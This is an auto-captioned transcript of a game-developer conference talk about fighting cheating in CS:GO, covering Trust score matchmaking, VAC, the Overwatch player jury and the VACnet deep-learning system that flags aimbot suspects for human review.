[02:55] agree that you could be you know signing
[02:57] up for a 90 minute commitment the
[03:00] average game is actually more like 40
[03:02] minutes 65% of our players check back in
[03:04] with this mode at least once a month and
[03:07] there are 600,000 of these matches every
[03:10] day it varies depending on time of day
[03:13] and sorry a day of week and you know
[03:17] summer there's a lot more matches
[03:19] school's out etcetera but it turns out
[03:22] turns out college kids love to play
[03:24] video games I don't know if any of y'all
[03:26] knew that but so let's let's dive in and
[03:29] talk about cheating because that's
[03:31] that's kind of why we're here
[03:32] so back in 2016 I was sort of figuring
[03:36] out what I was going to work on next I
[03:38] had finished up some other csgo work and
[03:40] and I was trying to figure out what I
[03:42] wanted to do and usually when I'm in
[03:44] that space valve I just kind of try and
[03:47] sort of figure out what the community
[03:48] wants cuz I figure anytime you sort of
[03:50] pay down some death in the community
[03:51] that's a pretty good investment while
[03:52] you're trying to figure out sort of
[03:54] larger problem to work on and it turns
[03:56] out I couldn't do that because the only
[03:58] thing the community was talking about
[04:00] was cheating it was this just deafening
[04:04] conversation and we saw this and of
[04:07] course like this information is all
[04:08] anecdotal but we saw it on on Reddit and
[04:12] we saw it on our own csgo teen feedback
[04:15] alias where players mail us directly I'm
[04:17] you know the feedback alias in
[04:19] particular I had some data on it was
[04:21] like 90% of the incoming mail was people
[04:23] saying your game is filled with cheaters
[04:25] and that's
[04:26] you know that's really frustrating but
[04:28] we weren't sure whether or not the
[04:29] problem was a sort of a perception
[04:33] problem or whether there was actually a
[04:34] cheating problem except it turned out
[04:37] that vac bans which we'll talk about in
[04:39] a little bit sort of supported this
[04:41] conversation like we had a lot of vac
[04:43] bans that we were handing out and we
[04:45] think that csgo has sort of two main
[04:49] components that lead to cheating being
[04:52] such a significant problem and there's a
[04:53] third aspect we'll talk about in a
[04:55] little bit but one is that the designs
[04:56] sort of the design is this very
[04:58] satisfying combat experience where
[05:00] almost any weapon in the game can be a
[05:02] one-shot kill but that does also sort of
[05:06] fail to disincentivize cheating I'm on
[05:08] balance we think that's a good trade
[05:09] because players really enjoy this but
[05:11] but it does sort of make us a juicy
[05:14] target for cheating similarly since the
[05:18] engine is so old it's and about 75 to 80
[05:22] percent of the code in csgo is actually
[05:24] unchanged from half-life 2 that means
[05:27] that if you have a cheap that somebody
[05:28] wrote back in say 2005 for half-life 2
[05:31] deathmatch and then they posted it on
[05:33] github a couple of years ago on a lark I
[05:35] think probably actually works on csgo
[05:37] with a small amount of of changes like
[05:42] maybe five to ten minutes of tinkering
[05:43] now the good news is we do actually
[05:45] catch pretty much all of those cheats
[05:47] like if it's on github you're gonna get
[05:49] banned for using it but but that just
[05:51] means that there's just this
[05:53] availability of cheats that we don't see
[05:56] in a lot of other places there are two
[05:59] main sort of cheats that are prevalent
[06:01] in csgo there's a third one that we're
[06:03] not really going to talk about today but
[06:04] it also is just this very minor sort of
[06:08] issue and the primary two are probably
[06:10] the two that you might be used to if
[06:12] you're familiar with cheating in your
[06:14] games and that is basically something
[06:16] that helps you aim better and something
[06:18] that gives you information that you're
[06:19] not supposed to have and you can sort of
[06:22] so the aim the aim hacks or aimbots tend
[06:26] to make it sort of much much easier for
[06:28] you to communicate headshot that guy
[06:30] because because in csgo
[06:33] if I see a target and I want to headshot
[06:35] him I need to identify him I need to
[06:37] decide that he is an enemy or she could
[06:39] be
[06:40] decide that they're an enemy I need to
[06:42] move my mouse over I need to place it
[06:45] ideally on their head push them into the
[06:47] mouse and then start dragging it down to
[06:49] sort of deal with recoil or I could have
[06:51] a cheat that does all of those things if
[06:53] I just press the X button including not
[06:55] shooting if that person is actually a
[06:57] friend of mine and so that that
[06:59] communication of intent there is a big
[07:01] Delta between sort of the intent of the
[07:03] action and the actual action
[07:05] I mean information assistance hacks are
[07:08] exactly what you would expect wall hacks
[07:11] you know substituting materials or what
[07:14] have you but it's just giving you
[07:15] information that basically you shouldn't
[07:18] have and then there's sort of this scale
[07:19] that we sort of think about hacks on
[07:22] there's the subtle cheats where somebody
[07:24] is trying to basically pretend that
[07:26] they're a better player than they are
[07:28] and those are actually pretty hard to
[07:29] detect and not what we went after first
[07:32] and then sort of the scale kind of ramps
[07:35] up in obviousness until you get to what
[07:37] we call rage cheats and the purpose of a
[07:39] rage cheat is not not subtlety the
[07:42] purpose of a rage cheat is to make you
[07:44] pissed off that I am cheating and there
[07:46] is nothing you can do about it and all I
[07:48] want to do for the next 40 minutes is
[07:50] ruin your day and so we decided that
[07:54] seems like a pretty good target to go
[07:55] after first
[07:57] now cheating because of the 5v5 nature
[08:01] in csgo you can sort of think like about
[08:05] the cheating problem as it relates to an
[08:07] individual user so if I'm gonna play a
[08:10] competitive match given that I am clean
[08:12] even a low base rate of cheating like if
[08:15] two percent of players are sort of
[08:17] cheaters and they're randomly
[08:18] distributed then two out of ten matches
[08:21] that I play are gonna be dirty and if
[08:24] the rate is of if the base rate of
[08:26] cheating were seven percent like half of
[08:28] the matches that I into will have at
[08:30] least one cheater and that is again
[08:32] assuming that I'm a clean player because
[08:33] there are nine other opportunities for a
[08:35] cheater tool and the other thing that is
[08:38] maybe mildly that's slightly even more
[08:42] irritating about that is that given that
[08:43] you were a clean player you are more
[08:45] likely to play against a cheater than
[08:47] you are to have a cheater land on your
[08:49] team because there are only four slots
[08:50] for them to land on your team in five
[08:52] slots for them to land
[08:53] the other team so that that makes it an
[08:56] even more irritating problem for our
[08:59] sort of good actor players now the good
[09:01] news is we're gonna I'm gonna spend a
[09:03] minute here sort of an into digression
[09:05] the good news is that we don't actually
[09:06] just randomly distribute our players we
[09:09] release the system in 2016 called trust
[09:12] score and this sort of mitigates the
[09:14] damage of cheating a fair amount and the
[09:16] idea is that we sort of pay attention we
[09:18] trained the model based on how you
[09:20] interact with csgo and how you interact
[09:22] with Steam and we use that to try and
[09:25] predict how likely it is that you're
[09:27] going to go on to receive a ban of some
[09:29] sort and then we basically use that
[09:32] trust score to match - as an additional
[09:35] factor when we're doing matchmaking like
[09:37] in addition to your skill and what map
[09:39] you want to play and you know sort of
[09:41] other things and that lets us sort of
[09:43] put known good actors in with other
[09:46] known good actors more often and so as a
[09:48] result our known good actors run into
[09:50] cheaters way less often and this can
[09:52] sort of be more easily visualized like
[09:54] imagine this is just a population of
[09:56] players don't count them there are 50
[09:58] dots here and so we need to set them
[10:00] into 5 5 b 5 matches and because it is
[10:05] way easier to do with PowerPoint maybe
[10:08] we set our matches up like this right
[10:10] and so now we've created five matches
[10:12] and let's find out how we did so you
[10:16] have this sort of concept for that we're
[10:18] going to introduce called the rainbow of
[10:19] trust and we think that blue players are
[10:21] very unlikely to go on to receive bands
[10:23] but red players are very likely to go on
[10:26] to receive bands now you might be asking
[10:28] if the red players are likely to go on
[10:30] to receive bands why don't you just ban
[10:32] them the answer is because they haven't
[10:34] cheated yet like we don't know for sure
[10:36] that they're cheaters they are just more
[10:38] likely to go on to be cheating but let's
[10:41] assume in this case that five of the red
[10:43] players are cheating you can see that in
[10:45] the worst case here like all five of
[10:47] these matches now have cheaters and what
[10:50] Trust lets us do is basically say hey
[10:52] when we're trying to build matches if we
[10:54] assume all of these players are sort of
[10:55] that any subgroup of ten players here
[10:58] would form a reasonable match we could
[11:00] draw our matches like this instead and
[11:02] now we've created four good matches and
[11:04] the players who were most certain are
[11:06] going to go into cheap are very unlikely
[11:09] to run into cheaters so we have a bunch
[11:13] of data that shows that Trust works
[11:15] really well but I kind of prefer the
[11:16] anecdotal version instead and that's
[11:18] that we actually wants to trust about
[11:20] six months before before we announced it
[11:24] and during that time we were gathering
[11:26] feedback and looking for people that
[11:28] sort of like had bugs like just general
[11:31] feedback right they didn't know that we
[11:32] were running the experiment but and so
[11:35] what would happen is you'd see a thread
[11:37] pop up on like the steam community
[11:39] forums where somebody would say csgo is
[11:41] filled with cheaters and then you'd see
[11:43] somebody else reply and usually quite a
[11:45] few someone else's who would reply and
[11:46] say I don't really ever run into
[11:48] cheaters anymore I don't know what
[11:49] you're talking about and at this point
[11:51] we had sort of been public about some of
[11:53] the other anti-cheat work that we are
[11:54] doing and so the playerbase assumed that
[11:56] that was why they weren't seeing
[11:57] cheaters as often but we would go and
[11:59] basically say like hey let's go figure
[12:01] out you know what what this person's
[12:04] trust score is and we'd go and we'd look
[12:05] at the opie and you'd be like this dude
[12:08] is types of 50 accounts and 49 of them
[12:10] have bands for cheating I don't care
[12:13] that that guy runs in the cheaters he
[12:14] should run into cheaters because he's
[12:16] definitely going to cheat again but
[12:17] maybe he hasn't done it yet so that's
[12:20] pretty much all I kind of wanted to say
[12:22] on trust I did want to mention though
[12:24] like a thing that's cool about Trust is
[12:25] that it doesn't it doesn't really reduce
[12:27] the rate of cheating but it reduces the
[12:29] blast radius when people decide to cheat
[12:33] so let's dive in and talk about a couple
[12:37] of the other anti cheat things that that
[12:39] we do so the main probably the main
[12:44] thrust of work that we do is just
[12:45] mitigating exploits we just fix you know
[12:47] fixed bugs when they come in and and
[12:50] that goes away somebody reports hey
[12:52] here's this problem we investigate we
[12:54] figure out what the problem is and we
[12:55] fix it and so one of the canonical
[12:57] examples for this was this speed hack it
[13:00] turned out that players realized some
[13:03] malicious players realized that if they
[13:05] this parts a little bit technical I'm
[13:07] sorry but they basically realized that
[13:10] if they lied to the process they lied to
[13:12] csgo about how fast their clock was
[13:16] running they could convince the game
[13:17] client
[13:18] that basically it was running ten ticks
[13:21] at a time and so then the game client
[13:23] would faithfully be like hey server
[13:25] here's ten movement packets and that
[13:28] would effectively and then the game
[13:30] server was like you know for reasons
[13:32] that client authoritative feels awesome
[13:34] we would we would bait the game server
[13:37] would just go yeah ken looks good to me
[13:39] and it would just process all ten
[13:41] movement packets in sort of a single
[13:45] server tick and then the result of that
[13:47] is that that player would just sort of
[13:48] appear to just teleport around the map
[13:50] effectively it will and so the fix was
[13:53] basically as brutally simple as you
[13:55] imagined it would be it is that the
[13:57] server is like I'm you know modulo some
[13:59] latency issues I'm only going to accept
[14:01] one movement packet for each client per
[14:05] tick and the problem just goes away now
[14:08] this is like I said this is sort of our
[14:10] primary form of mitigating exploits it's
[14:13] always an option it's always ongoing
[14:14] work and the thing is is that as we do
[14:16] that work like bad actors continue to
[14:18] probe and try and find new areas and
[14:20] this sort of evolutionary behavior on
[14:22] their part results in this treadmill of
[14:24] work and we don't mind doing the
[14:25] treadmill of work it's important
[14:27] valuable work but it is a treadmill that
[14:29] we're sort of signed up for it
[14:31] another primary form of anti-cheat that
[14:34] we utilizes vac valve anti-cheat and
[14:37] valve vac basically is a system of sort
[14:41] of client-side detections so I'm gonna
[14:43] pay attention to what's going on your
[14:45] system and then I'm gonna anonymize that
[14:47] and scrub it of anything that might be
[14:50] personally identifiable and then I'm
[14:51] going to hand it up to the server and
[14:53] now that vac is only active when you're
[14:56] connected to vac secured servers and if
[14:57] you receive a vac ban it only prohibits
[14:59] you from playing on vac secured servers
[15:01] but that is about 98% of servers so
[15:05] you're you're pretty locked down at that
[15:07] point and then the evidentiary standard
[15:09] for vac meaning like win back takes an
[15:11] action we're a hundred percent certain
[15:14] that you had your hand in the cookie jar
[15:16] with a caveat and the caveat is that
[15:19] sometimes we make mistakes but when we
[15:21] make mistakes we rectify them clearly
[15:23] and immediately there's a blog post
[15:25] there's a clarification that this was
[15:27] the thing and it was wrong and we fixed
[15:29] it and we're very sorry and as a result
[15:31] of this
[15:31] our community has very high confidence
[15:34] that when vak takes action that we are
[15:37] punishing cheaters which is borne out
[15:40] but interestingly I know that a lot of
[15:42] devs actually struggle with the opposite
[15:44] problem they have an anti cheat and
[15:46] their players believe that their anti
[15:48] cheat really gets cheaters but they're
[15:50] not actually certain that that the anti
[15:53] cheat isn't also punishing innocent
[15:55] users we definitely don't have that
[15:58] problem we're very happy about that okay
[16:02] so we don't talk about vac very often
[16:05] and the reason that we don't talk about
[16:07] that is that talking about it makes it
[16:09] less effective and in particular talking
[16:12] about detections just stops them from
[16:14] working so for example if I got up on
[16:18] stage today and I said hey guys here's a
[16:20] detection what we do is when somebody
[16:23] has a process and their process is
[16:25] scribbling into CS goes memory we go
[16:27] identify all of the binary parts of that
[16:29] process and then we go find the
[16:32] executable code that loaded that process
[16:34] from disk and then we md5 Summit and
[16:36] then we send it home and we figure out
[16:38] if that is a malicious actor or like OBS
[16:42] or something instead when I tell you
[16:44] that that's the thing that we do I just
[16:45] lift that thing on fire like it doesn't
[16:47] work anymore or at least by the time
[16:49] this it's twitch and you know three
[16:50] seconds it definitely won't work anymore
[16:53] the good news is that we actually have
[16:55] thousands of detections that are sort of
[16:57] various sophistication and we write more
[16:59] every day but again every time we do
[17:01] this our bad actors evolve and the
[17:04] treadmill continues alright great so
[17:08] let's let's get to why we think deep
[17:10] learning might be an effective component
[17:12] in our sort of anti-cheat strategy but
[17:15] before we do that let's talk a little
[17:17] bit about deep learning so if you're not
[17:20] really familiar with deep learning at
[17:21] all or you're just familiar with the
[17:22] buzzwords then I'm gonna give you the
[17:25] 40,000 foot view and the basic concept
[17:27] behind deep learning is that deep
[17:30] learning can help you basically just
[17:31] automatically build a function that maps
[17:34] inputs to outputs so if you're familiar
[17:36] with algebra notation you're probably
[17:38] familiar with y equals f of X right and
[17:41] we're just saying like Y is the result
[17:42] of applying some F to some input
[17:45] and the cool thing about deep learning
[17:47] is deep learning says if I have enough X
[17:49] and I have enough Y I can solve for F
[17:52] and that's pretty powerful it turns out
[17:55] that then you can take that F that you
[17:57] have just built and you can apply it to
[17:59] sort of never-before-seen X values and
[18:01] get actually pretty sensible wise and if
[18:03] you don't use deep learning then
[18:05] engineers are writing your f values
[18:06] that's that treadmill of work that we
[18:08] were talking about and that lets you
[18:11] make this trade that it valve were
[18:13] really excited about that lets us
[18:14] basically trade data and compute for
[18:16] engineering time because the valve we
[18:18] are always always short on engineers but
[18:21] we have a lot of data and we have a lot
[18:22] of compute power so if I were to take
[18:25] this analogy if maybe you don't follow
[18:26] along with the algebra and I were to
[18:28] take this into the real world maybe you
[18:30] would imagine that if I had a bunch of
[18:34] cubes of meat and I had a bunch of
[18:36] hamburger patties and I had enough of
[18:38] them that and I told deep learning
[18:40] hey build me build me the thing that
[18:43] will convert these cubes of meat into
[18:44] delicious hamburger patties it's gonna
[18:46] give me a meat grinder and with that so
[18:50] that is the analogy that we're gonna
[18:52] stick with a little bit through the talk
[18:54] and I apologize to vegetarians I'm
[18:56] really sorry we work shop what else
[18:58] could it be and it's like this one works
[19:00] really well so I'm sorry now you might
[19:04] have noticed that I said that we're only
[19:06] building a possible function that map's
[19:07] inputs to outputs and the reason is
[19:09] basically data starvation problem you
[19:14] could if you had enough X&Y like there
[19:16] is a closed form solution that is sort
[19:19] of the best possible F that converts
[19:22] that X to Y but the thing is is that you
[19:24] would need so much data so so so much
[19:27] data like quintillions of examples
[19:31] quintillions and quintillions of
[19:33] examples even for very simple functions
[19:35] so the reality is that like you're not
[19:36] going to do that you're gonna get just
[19:38] one of the myriad of possible solutions
[19:41] now deep learning is actually really
[19:45] good at pattern recognition it's really
[19:47] good at things that you're already
[19:49] familiar with like is there a cat
[19:51] sitting on the sofa the answer is yes
[19:53] and also if you have a computer the
[19:56] computer in your pocket
[19:58] you have interacted with Siri or Google
[20:00] assistance deep learning is made use of
[20:02] to transform the words that you say into
[20:05] text that then translates to commands
[20:07] that then is used to sort of do fuzzy
[20:10] lookups and it's used in so many pieces
[20:12] along the way now deep learning
[20:15] basically operates in two modes there's
[20:17] sort of training time where you're like
[20:19] hey I've got a bunch of cubes of meat
[20:20] and I have hamburger patties and I want
[20:22] to build a meat grinder and it'll and
[20:25] then once you've built that meat grinder
[20:26] it's like great now I want to take these
[20:29] cubes of chicken and I want to turn
[20:31] those into a chicken burger because that
[20:32] sounds like a thing that might be good
[20:34] deep learning is that works in these two
[20:37] modes that we call like I said training
[20:39] and imprinting now I might during the
[20:42] talk accidentally say machine learning
[20:43] because we actually do a fair amount of
[20:45] machine learning at valve as well and
[20:48] the simplest way to talk about this for
[20:52] the purposes of my talk if I use machine
[20:54] learning you should just assume I mean
[20:55] deep learning but but if if this sort of
[20:58] red circle represents deep learning then
[21:00] this orange circle represents machine
[21:02] learning like deep learning
[21:03] fundamentally it's just a subfield of
[21:06] machine learning in simultaneous Immel
[21:08] early when people are talking about deep
[21:10] learning what they're really talking
[21:11] about is neural nets so if you learned
[21:13] those thirty years ago it turns out they
[21:16] finally work spoiler alert the solution
[21:18] to get them to work was to have a
[21:20] million times as much data and a billion
[21:22] times as much compute and then they work
[21:24] great all right so let's get back to our
[21:28] elevator pitch so we were basically we
[21:33] were looking at like how do we attack
[21:34] this cheating problem we tossed around a
[21:36] ton of ideas but I didn't I really
[21:38] didn't want to sign up for the treadmill
[21:40] and so looking at this it was like well
[21:43] you know humans when they watch matches
[21:45] they can tell that cheating is occurring
[21:47] and I think that's probably because
[21:48] they're detecting a pattern of cheating
[21:50] and deep learning is really good at
[21:52] detecting patterns so like shouldn't
[21:53] deep learning be able to detect cheating
[21:55] and as I mentioned before aimbots seem
[21:58] like both the largest the biggest
[22:00] problem because because they're not
[22:02] subtle at least a lot of them are not
[22:04] subtle and they're also this sort of
[22:06] really loud signal at least it seems
[22:08] like so it seemed like well we should go
[22:09] after those first because if we can't do
[22:11] those
[22:11] then we're definitely not going to be
[22:13] able to do the things that are more
[22:14] subtle now if you recall I mentioned
[22:16] that deep learning is trying to solve y
[22:19] equals f of X for F the problem was like
[22:23] if only we had a source for X&Y good
[22:25] news it turns out we had a source of X&Y
[22:28] for years
[22:30] CS Co has had this system called
[22:32] overwatch no relation which is a jury
[22:35] review system and but basically what we
[22:39] have is we have players they watch cases
[22:41] and we bet those are our X values and
[22:44] then they decide guilt through some
[22:46] process that I don't know I don't know
[22:47] what their process is and then they
[22:49] render a verdict and and they do this in
[22:52] this way where they go through this
[22:54] process they players report other
[22:56] players and then a sort of central
[22:58] coordinator selects cases by the way
[23:01] that is a that is a computer it is not a
[23:02] person there isn't like a guy at valve
[23:04] that is like I am the coordinator that
[23:06] would be kind of cool but it's not a
[23:08] thing and then the players adjudicate
[23:11] those cases they other players basically
[23:12] decide is this person guilty and they do
[23:15] that through a process where they're
[23:16] sort of presented with an evidentiary
[23:18] window the evidentiary window is eight
[23:20] rounds long and they're asked like hey
[23:23] watch and the play time is a minimize so
[23:26] you don't know who the players are and
[23:27] you watch basically a demo of eight
[23:29] rounds and then at the end you're asked
[23:31] did this person use aim assist Invicta
[23:35] them if you believe there is evidence
[23:36] beyond a reasonable doubt and we ask
[23:38] that for Amos iStent movement assistance
[23:41] information assistance and other
[23:43] assistance that we're not sure about and
[23:46] also griefing if you're guilty you get a
[23:50] BAM and if you're not guilty there's no
[23:52] punishment right so it works kind of the
[23:54] way that you would expect it to over
[23:55] watch uses naive Bayes to basically look
[23:58] for a guilty threshold that's a bunch of
[24:01] Mathew stuff I'm not really going to go
[24:02] through but the point is that according
[24:04] we have a model and basically the
[24:06] evidentiary standard is that 99 that it
[24:09] needs to be ninety-nine point eight
[24:11] percent likely as decided by your peers
[24:13] that you were cheating now the actual
[24:14] rate that people get convicted at is
[24:16] usually five nines like usually
[24:19] convictions and overwatch the jurors are
[24:21] super super convinced that that person
[24:23] is a cheater
[24:25] so as I mentioned the system had existed
[24:28] for kind of a while so back in 2015 we
[24:31] decided hey we noticed this trend we did
[24:34] some work and as a result it increased
[24:36] participation and over watched and it's
[24:37] probably worth explaining a little bit
[24:39] about this graph the gray line at the
[24:41] top is the sort of total participation
[24:42] in overwatch and the blue line is
[24:44] basically the number of cases that were
[24:47] dismissed and the red line is
[24:48] convictions and so we noticed this great
[24:51] trend were like hey this is awesome as
[24:53] more people participate in overwatch we
[24:56] get more convictions so we should
[24:57] probably get more people to do overwatch
[24:59] that would be awesome so we this graph
[25:12] it just shoots up in participation it's
[25:14] amazing there's so much participation it
[25:16] turns out the conviction rate doesn't
[25:18] move at all like well the number of
[25:20] convictions is stone-dead flat and then
[25:22] that is a trend that we see continuing
[25:25] on this graph which is also amazing and
[25:28] I will totally make sure that those are
[25:29] fixed when we post I don't know why they
[25:31] were broken I'm very sad I'm sorry ok so
[25:34] the thing that we found in those graphs
[25:36] that you guys totally loved is that
[25:37] overwatch really helps us with blatant
[25:39] cheaters but he doesn't handle subtle
[25:41] cheats as well and that it turned out
[25:43] that increasing participation like
[25:46] incentivizing participation and
[25:47] increasing participation didn't help at
[25:50] all like it seemed like the problem was
[25:53] basically that we were failing to
[25:56] properly select cases no the bad news is
[26:02] that as players got convicted and over
[26:05] watched they would sort of evolve their
[26:07] behavior but the good news is that
[26:08] jurors evolved as well like they're not
[26:11] fooled by your new oh well I'll just
[26:13] turn 75° a frame instead of 78° of frame
[26:16] jurors are like nah man that's still
[26:18] cheating Bowl so the elevator pitch
[26:22] for vac net was born and the idea was
[26:24] that basically we would use this
[26:26] overwatch as a giant pool of labeled
[26:29] data and we would train vac net from
[26:32] overwatch and then we would build a
[26:35] cluster of machines that would monitor
[26:37] matches with them
[26:37] that we built we would use back net then
[26:41] to submit cases and then humans would
[26:43] ultimately decide whether or not the
[26:45] person was a cheater so back to our sort
[26:48] of overwatch pipeline all we have to do
[26:50] is slot in vac net kind of right here
[26:53] okay so how did we do man I hope my
[26:57] grafts work over here oh boy
[27:00] okay good I have a later graph that I
[27:03] see is totally good so we're just gonna
[27:04] skip ahead great so oh yeah hey hey
[27:08] here's the period I'm sorry I know I
[27:09] said I wouldn't move here is the period
[27:11] where we had increased participation
[27:13] right here and you see this conviction
[27:15] rate just doesn't move at all it was
[27:17] just horrifying and and and again
[27:19] throughout here like our participation
[27:21] fell and it just didn't impact the
[27:22] conviction rate at all sorry all right
[27:26] okay so so we deployed back in it we
[27:30] deployed back in it in early 2017 and
[27:32] during this time participation sort of
[27:36] doesn't really change like in maybe is
[27:38] going up a little bit if you squint at
[27:40] it but most likely what's happened is it
[27:41] sort of just asymptotes it down to the
[27:44] level of participation that we expect it
[27:45] looks a whole lot like sort of any game
[27:47] launch ever that has sales right so here
[27:53] we deployed back net and you can see hey
[27:55] we started getting more convictions
[27:56] that's great and we deployed a really
[27:58] simple model we didn't quite have enough
[28:00] data yet but we were like hey this thing
[28:03] is doing pretty good in the conviction
[28:04] rate overall for vac net I started to go
[28:06] up and then a little bit later we had
[28:08] the opportunity to sort of train with
[28:10] more data until finally in December
[28:13] early December we hit the crossover
[28:15] point we're now like we actually get
[28:17] more convictions than non convictions
[28:19] and overwatch so yeah the system works
[28:22] great so how great does it work
[28:25] so human submitted cases when a human
[28:28] submits a case to overwatch the
[28:30] likelihood that they get a conviction is
[28:32] only fifteen to thirty percent and that
[28:35] sort of varies on a bunch of factors
[28:37] like the factors might include the time
[28:38] of day the day of the week the time of
[28:40] the year is the game on sale is visit
[28:43] Spring Break spring break and you know
[28:45] there's a bunch of things but but the
[28:47] point is that human convictions are very
[28:48] low
[28:49] I'm back net convictions are very high
[28:51] like vac net gets a conviction when it
[28:53] submits a case it convicts eighty to
[28:55] ninety five percent of the time and it
[28:57] varies pretty much on the same factors
[28:59] with one exception and that one
[29:01] exception is that whenever we retrain
[29:02] vac net its conviction rate is like
[29:04] nearly a hundred percent for a little
[29:07] while until cheaters adapt and start to
[29:10] react to it alright so hopefully I've
[29:14] convinced you this is kind of a cool
[29:16] thing and it works pretty well and I'm
[29:18] good at Excel we can talk about how we
[29:21] train a learner and we're only gonna
[29:22] spend one slide on this because I really
[29:25] just wanted here to give you a pointer
[29:27] to Karis which is like if you're new to
[29:29] deep learning
[29:30] Garrus is great but the sort of main
[29:33] sort of thrust of training the learner
[29:35] is that you need lots of xmy data and at
[29:38] least for supervised learning which is
[29:40] the thing that we've been sort of
[29:42] talking about here you need lots of X Y
[29:44] data you need to fit it and then sort of
[29:46] you just repeatedly ask hey how are you
[29:48] doing hey how are you doing you have
[29:50] some measures that you pay attention to
[29:51] and you're like how are you doing are
[29:52] you doing good are you doing better
[29:53] great and then when it stops getting
[29:55] better you're like okay hold the phone
[29:57] I've got my meat grinder and then like I
[30:00] said you want to take a look at Karis so
[30:04] we're gonna jump ahead and talk about
[30:05] how we actually feed this thing so you
[30:08] recall the metaphor it the metaphor is
[30:09] that we have this meat grinder and all
[30:11] we need to do is feed it cubes of meat
[30:13] and the problem is that as a game
[30:15] developer you don't have cubes of meat
[30:17] what you have is a cow and that's not a
[30:21] commentary on your engine my engine is
[30:23] the cow east of all cows but but what
[30:27] you have is not the thing that you need
[30:28] and the good news is well if you think
[30:31] about it like the bulk of the work of
[30:33] like how do I turn this cow into a
[30:35] delicious hamburger you're like well the
[30:36] overwhelming majority of the work is how
[30:39] I turn the cow into cubes of meat like
[30:41] that is the work and in terms and it
[30:43] turns out it's actually like 95 percent
[30:46] of the effort that you're going to spend
[30:47] and all of that effort is basically
[30:49] effort that you already know how to do
[30:51] it is just bog standard engineering work
[30:53] there's no sort of magic box around it
[30:56] only 1% of the effort is actually kind
[30:58] of around like deep learning turning you
[31:01] know in our metaphor it's turning the
[31:02] crank
[31:03] and 4% is cooking the metaphor breaks
[31:05] down a little bit here so we should we
[31:07] should probably just leave it there for
[31:09] a little bit maybe we'll come back if
[31:12] you have a game to sort of be a little
[31:13] more concrete there are some pieces that
[31:16] you really want to have and I think the
[31:18] most important is that you want to have
[31:20] a replay format we call it a demo format
[31:22] you know other engines call it other
[31:24] things but the sort of salient point
[31:27] here is like you basically want to have
[31:28] a record that you ideally recorded from
[31:31] the server or from a third party
[31:33] observer like you don't want the client
[31:34] to record this thing because they will
[31:36] just lie and you want to be able to play
[31:39] that thing back later and then you need
[31:42] you know all of the sort of
[31:45] infrastructure around storing and
[31:46] fetching those things and transmitting
[31:48] them and you're gonna want to manage
[31:50] metadata so you can say like which
[31:51] player was in this match so that you can
[31:54] evaluate them and ideally and this is
[31:57] the big ask I know you need a data
[32:00] labeling service ideally no I do
[32:02] actually think that there is a way to
[32:04] attack this problem that doesn't require
[32:06] a data labeling service but I haven't
[32:09] proven it yet so maybe I'll see you in
[32:11] 2019 and we can talk about it then and I
[32:15] want to switch gears a little bit now
[32:16] and talk about sort of our data herd so
[32:20] I mentioned before that we have roughly
[32:22] 600,000 5v5 matches per day and for each
[32:27] of those five to five matches to
[32:29] evaluate all ten players there's roughly
[32:32] four minutes of work that we have to do
[32:33] and so if you do the math you figure
[32:35] that is 2.4 million CPU minutes of work
[32:38] that we need to do every day and somehow
[32:40] we need to fit that into 14 hundred and
[32:42] forty actual minutes because that's how
[32:44] many there are a day and you can do this
[32:47] by just using a bunch of processors we
[32:50] need about 1,700 so that's what we did
[32:53] we bought a giant farm machines and this
[32:57] is actually only used this is not used
[32:59] for training this is only used for
[33:02] running the inferencing sides of things
[33:04] and this is actually only half of the
[33:07] farm the other half is in a different
[33:09] data center right this is our actual
[33:10] farm I took this picture I went out with
[33:11] the dev ops team when we got them I was
[33:13] like super excited I've never been to
[33:15] data center before and it was like candy
[33:17] trip it was great and then I was like
[33:18] wow it's really loud in here and it's
[33:19] really cold on this side and it's really
[33:21] hot on that side but it's it's totally
[33:23] worth going you should go if you get a
[33:24] chance anyways what we're looking at
[33:26] here is basically these two CH a C's and
[33:29] each chassis basically has 16 blades
[33:33] those are the things that are sort of
[33:34] vertical and each of those blades has 54
[33:38] cores and 128 gigs of ram so they're
[33:40] pretty beefy that's about 3,500
[33:43] processors total and we we bought
[33:46] basically 2x what we needed so that we
[33:48] would have room to expand and we'll
[33:51] maybe talk about that in a little bit
[33:52] too like I said though this is basically
[33:56] only used for inferencing time this is
[33:58] like I've already built the meat grinder
[33:59] and now I need to actually watch all of
[34:02] the matches and like I said 95% of the
[34:04] work is basically a round turning
[34:05] account of meat for us 95 percent of the
[34:08] work is like cracking the demos and then
[34:09] building inputs out of that to feed into
[34:11] the learner and then it's like like 1%
[34:14] of the work is the part where it's like
[34:15] by the way does this look like a cheat
[34:17] by the way does this look like a cheat
[34:19] the the part that we do the training the
[34:22] part where we actually build the meat
[34:23] grinder the part is just run on
[34:25] commodity 1080 T eyes that's it under
[34:28] our desks like there it's totally normal
[34:31] hardware ok so now I want to talk brass
[34:35] tacks I want to talk about like what
[34:37] goes into the cubes of meat that we're
[34:40] feeding our model deep-learning has sort
[34:45] of these specific input constraints in
[34:47] our case we've said let's keep a meat
[34:49] and that means that the meat needs to be
[34:50] sort of uniform and fixed size and if
[34:54] you're uncomfortable with a meat analogy
[34:56] and maybe you're familiar with sequel
[34:58] then you can kind of just think about
[35:00] like this thing just needs to be fed
[35:01] with database where all of the columns
[35:04] are non nullable and every time you ask
[35:08] run a query you always make sure you ask
[35:10] for all of the columns and you ask for
[35:11] the columns in the same order and deep
[35:14] learning needs to sort of like deep
[35:16] learning algorithms need to be fed in
[35:17] that way now if you recall we decided
[35:22] that we were going to specifically
[35:23] target aim assistance first that was the
[35:26] first thing that we were going after
[35:28] and if you think about like when
[35:30] somebody is cheating using an aimbot
[35:32] they're gonna basically use their gonna
[35:35] express that cheating us like win
[35:37] bullets when they're firing bullets
[35:39] downrange and so we basically did some
[35:42] manual feature work around around that
[35:46] so here we're gonna sort of have this
[35:49] atom on the right and we'll fill the
[35:52] atom with stuff and the first thing that
[35:54] we decided to stuff into the atom was
[35:57] like what weapon is the person using or
[35:58] they use in an OP or they using an ak-47
[36:02] and in for a for cuz no one uses
[36:04] anything else they're using one of those
[36:06] and then it's cool there are other guns
[36:10] they're great you should try them then
[36:13] then we want to know basically what was
[36:15] the result of of that shot was it a head
[36:18] shot was it a hit like but somewhere
[36:20] else that wasn't the head was it a total
[36:22] miss and we want to stick that thing
[36:24] into our sort of atom of stuff and then
[36:27] we want to know like hey given that I
[36:28] actually did manage to get a hit because
[36:30] I don't have the answer otherwise how
[36:33] far away was the target if it was a hit
[36:35] and we have a sort of special value that
[36:37] we reserved for the cases where we're
[36:39] like I don't know it didn't hit and the
[36:41] learner is fine with that and then this
